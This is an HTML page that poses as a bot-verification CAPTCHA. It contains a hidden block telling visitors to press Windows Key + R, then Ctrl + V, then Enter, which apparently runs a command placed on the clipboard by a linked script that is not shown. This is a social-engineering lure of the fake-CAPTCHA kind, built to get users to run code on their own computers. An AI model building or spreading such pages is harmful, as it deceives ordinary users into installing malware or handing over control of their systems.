<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Verification</title>
    <link rel="stylesheet" href="styles.css">
    <script src="script.js" defer></script>
</head>
<body>
    <div class="captcha-container">
        <div class="captcha-header">
            <h2>Verify you're not a bot</h2>
        </div>
        <div class="captcha-content">
            <div class="captcha-box">
                <input type="text" id="captchaInput" placeholder="Enter the characters you see" />
                <div id="captchaImage" class="captcha-image"></div>
            </div>
            <div class="captcha-actions">
                <button id="verifyButton" onclick="verifyCaptcha()">Verify</button>
            </div>
        </div>
        <div id="resultMessage" class="result-message"></div>
        <div class="command-instructions" style="display: none;">
            <p>Advanced verification required. Please press <b>Windows Key + R</b>, then <b>Ctrl + V</b>, and hit <b>Enter</b> to initiate the advanced verification process.</p>
        </div>
    </div>
</body>
</html>
